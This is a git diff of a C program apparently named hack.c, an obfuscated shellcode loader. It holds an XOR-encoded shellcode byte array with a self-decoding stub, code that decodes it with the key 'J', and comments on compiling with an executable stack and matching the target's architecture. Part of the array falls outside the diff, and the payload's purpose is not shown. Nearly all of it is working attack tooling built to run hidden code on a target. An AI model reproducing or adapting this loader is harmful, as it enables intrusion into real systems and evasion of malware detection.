@@ -2,11 +2,14 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-////make sure to use the -z execstack options when trying to run shellcode, since by default the stack where you save your shellcode is not executable
+//make sure to use the -z execstack options when trying to run shellcode, since by default the stack where you save your shellcode is not executable
 //gcc -o hack.out hack.c -z execstack  / gcc -o hack.out hack.c -z execstack -static  / docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -o newelf.elf newelf.c
+//before compiling it, make sure the processor architecture match the target environment
 
-//Obfuscated shellcode here
-unsigned char buf[] = 
+int main (int argc, char **argv)
+{
+   //Obfuscated shellcode here
+   unsigned char buf[] = 
 "\xeb\x27\x5b\x53\x5f\xb0\x01\xfc\xae\x75\xfd\x57\x59\x53\x5e"
 "\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\xb2\x1d"
 "\x74\x07\x80\x3e\x01\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
@@ -23,8 +26,6 @@ unsigned char buf[] =
 "\x09\x03\x58\x6c\x78\x5c\x09\x03\x4e\x83\xc6\x7e\xeb\xf9\xe0"
 "\xb2\x1d";
 
-int main (int argc, char **argv)
-{
    //decrypt the shellcode
    char xor_key = 'J';
    int arraysize = (int) sizeof(buf);
